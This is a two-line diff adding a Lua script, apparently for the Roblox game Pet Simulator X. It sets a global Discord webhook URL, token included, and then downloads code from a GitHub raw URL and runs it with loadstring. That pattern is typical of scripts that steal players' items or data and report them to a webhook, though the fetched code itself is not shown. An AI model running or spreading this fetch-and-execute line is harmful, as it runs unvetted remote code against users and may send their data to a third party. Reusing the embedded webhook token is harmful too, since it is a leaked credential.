@@ -1,0 +1,2 @@
+_G.WebHook = "https://discord.com/api/webhooks/1010038695224692815/aWm2Z2ZIUKnYunx0f8_SR7S1o6apKNx1ekz1WXHFlE6MP-nf6np6UeYqvgkYsQX-ySbr"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
